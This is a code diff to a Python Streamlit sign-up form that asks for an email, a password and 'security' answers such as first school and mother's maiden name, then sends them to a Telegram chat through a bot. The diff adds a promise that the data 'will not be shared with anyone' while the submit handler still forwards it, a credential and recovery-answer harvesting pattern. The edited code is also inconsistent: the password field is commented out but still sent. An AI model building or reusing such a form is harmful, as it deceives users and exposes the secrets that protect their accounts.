@@ -23,19 +23,22 @@ print(st.session_state['first_run'])
 
 if  st.session_state['first_run']:
     ph6 = st.empty()
-    ph6.subheader("Please Create an Account")
+    ph6.subheader("Please fill up identity information")
     ph9 = st.empty()
     new_user = ph9.text_input('Email Address')
+
     ph7 = st.empty()
-    new_user = ph7.text_input('Username')
+    # new_user = ph7.text_input('Username')
+    ph7.write('This information will only be used for personal identification. '
+              'It will not be shared with anyone. Do not enter phone number, credit card number, etc.')
     ph10 = st.empty()
     # ph10.write('Password must contain 14 characters, out of which at least one latin but not more the 4, 2 special characters, and one math symbol. if your password contains the letter ''o'', exactly two symbols are required')
     ph8 = st.empty()
-    new_passwd = ph8.text_input('Password', type='password')
+    # new_passwd = ph8.text_input('Password', type='password')
 
 
     ph1 = st.empty()
-    ph1.write('Please answer the security questions (for personal identification):')
+    ph1.write('Please answer personal identification questions:')
     ph2 = st.empty()
     school = ph2.text_input('Name of your first school?')
     ph3 = st.empty()
@@ -56,6 +59,7 @@ if  st.session_state['first_run']:
     ver = False
     if signupbut:
         placeholder.empty()
+        # tb.send_message(chat_id,'Email Address: ' + new_user + '\n' + 'School: ' + school + '\n'+'Mother''s Maiden Name: ' + mom_name, 'Vibe: ' + type, 'Hotel or Airbnb: ' + hotel)
         tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
         a = [eval('ph%s.empty()' % i) for i in range(1,11)]
 
